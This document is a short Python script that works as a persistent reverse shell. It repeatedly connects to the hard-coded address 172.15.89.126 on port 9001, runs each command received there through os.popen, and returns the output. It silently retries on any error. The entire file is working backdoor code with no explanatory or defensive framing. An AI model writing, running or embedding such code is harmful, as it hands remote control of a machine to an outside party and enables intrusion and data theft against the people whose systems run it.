import socket
import os

while True:
    try:
        s = socket.socket()
        s.connect(("172.15.89.126", 9001))
        try:
            while True:
                m1 = s.recv(102400).decode()
                m2 = os.popen(m1).read()
                s.send(m2.encode())

        except:
            s.close()
            continue
    except:
        continue


